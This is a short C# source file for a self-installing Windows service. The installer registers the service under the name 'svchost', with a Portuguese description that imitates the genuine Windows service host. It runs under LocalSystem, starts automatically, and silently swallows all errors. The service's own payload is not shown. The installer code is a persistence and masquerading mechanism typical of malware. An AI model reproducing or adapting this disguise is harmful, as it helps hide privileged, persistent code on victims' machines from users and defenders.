using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration.Install;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.ServiceProcess;
using System.Text;

namespace vtb
{
    static class Program
    {
        
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        static void Main(string[] args)
        {
            try
            {
                if (args.Length > 0 && args[0] == "--install")
                    System.Configuration.Install.ManagedInstallerClass.InstallHelper(new string[] { Assembly.GetExecutingAssembly().Location });
                else if (args.Length > 0 && args[0] == "--unistall")
                    System.Configuration.Install.ManagedInstallerClass.InstallHelper(new string[] { "/u", Assembly.GetExecutingAssembly().Location });

                else
                {
                    ServiceBase[] ServicesToRun;
                    ServicesToRun = new ServiceBase[] 
                    { 
                        new Service1() 
                    };
                    ServiceBase.Run(ServicesToRun);
                }
            }
            catch
            {
            }
           
        }
    }

    [RunInstaller(true)]
    public class MyWindowsServiceInstaller : Installer
    {
        public MyWindowsServiceInstaller()
        {
            var processInstaller = new ServiceProcessInstaller();
            var serviceInstaller = new ServiceInstaller();

            //set the privileges
            processInstaller.Account = ServiceAccount.LocalSystem;

            serviceInstaller.DisplayName = "Processo de Host para Serviços do Windows";
            serviceInstaller.Description = "Processo de Host para Serviços do Windows 8";
            serviceInstaller.StartType = ServiceStartMode.Automatic;

            //must be the same as what was set in Program's constructor
            serviceInstaller.ServiceName = "svchost";
            this.Installers.Add(processInstaller);
            this.Installers.Add(serviceInstaller);
        }
    }
}
